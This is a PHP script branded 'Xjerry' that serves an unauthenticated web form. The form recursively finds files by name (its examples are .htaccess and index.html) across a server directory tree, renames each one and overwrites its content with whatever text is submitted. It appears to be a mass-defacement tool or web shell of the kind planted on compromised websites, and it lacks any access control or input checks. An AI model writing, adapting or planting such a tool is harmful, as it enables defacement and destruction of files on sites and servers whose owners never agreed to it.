<?php
session_start();

// Error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

$notification = "";

// Function to recursively search and replace file names and their content
function renameAndModifyFiles($directory, $oldFileNames, $newFileName, $newContent) {
    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory));
    $renamedFiles = [];

    foreach ($iterator as $file) {
        if (in_array($file->getFilename(), $oldFileNames)) {
            $oldFilePath = $file->getPathname();
            $newFilePath = $file->getPath() . DIRECTORY_SEPARATOR . $newFileName;

            // Rename the file
            if (rename($oldFilePath, $newFilePath)) {
                // Replace the content of the new file
                file_put_contents($newFilePath, $newContent);
                $renamedFiles[] = $newFilePath;
            } else {
                return "Error: Could not rename $oldFilePath to $newFileName.";
            }
        }
    }

    if (!empty($renamedFiles)) {
        return "The following files have been renamed to $newFileName and their content has been updated:<br>" . implode('<br>', $renamedFiles);
    } else {
        return "No files matching the specified names were found.";
    }
}

// Handling form submission
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['old_file_names']) && isset($_POST['new_file_name'])) {
    $directory = '.'; // Current directory, can be changed to another directory if needed
    $oldFileNames = explode(',', $_POST['old_file_names']); // Accept multiple old file names, separated by commas
    $newFileName = $_POST['new_file_name'];
    $newContent = $_POST['new_content'];

    $notification = renameAndModifyFiles($directory, array_map('trim', $oldFileNames), $newFileName, $newContent);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rename Multiple Files and Modify Content - Xjerry</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body {
            background-color: #f0f8ff;
            font-family: Arial, sans-serif;
        }
        .container {
            margin-top: 50px;
        }
        .card {
            margin-bottom: 20px;
        }
        textarea {
            width: 100%;
            height: 200px;
            margin-top: 10px;
        }
        .popup {
            background-color: #4CAF50; /* Green */
            color: black;
            padding: 15px;
            border-radius: 5px;
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="card-header">
                <h2>Rename Multiple Files and Modify Content - Xjerry</h2>
            </div>
            <div class="card-body">
                <?php if (!empty($notification)): ?>
                    <div id="popup" class="popup"><?php echo $notification; ?></div>
                    <script>
                        document.getElementById('popup').style.display = 'block';
                        setTimeout(function() {
                            document.getElementById('popup').style.display = 'none';
                        }, 5000); // Hide after 5 seconds
                    </script>
                <?php endif; ?>
                <form method="post" action="">
                    <div class="form-group">
                        <label for="old_file_names">Enter the Current File Names (comma-separated, e.g., .htaccess,index.html):</label>
                        <input type="text" class="form-control" id="old_file_names" name="old_file_names" placeholder=".htaccess,index.html" required>
                    </div>
                    <div class="form-group">
                        <label for="new_file_name">Enter the New File Name (e.g., newfile.html):</label>
                        <input type="text" class="form-control" id="new_file_name" name="new_file_name" placeholder="newfile.html" required>
                    </div>
                    <div class="form-group">
                        <label for="new_content">Enter New Content for the File:</label>
                        <textarea id="new_content" name="new_content" required></textarea>
                    </div>
                    <button type="submit" class="btn btn-primary">Rename and Modify Files</button>
                </form>
            </div>
        </div>
    </div>
</body>
</html>
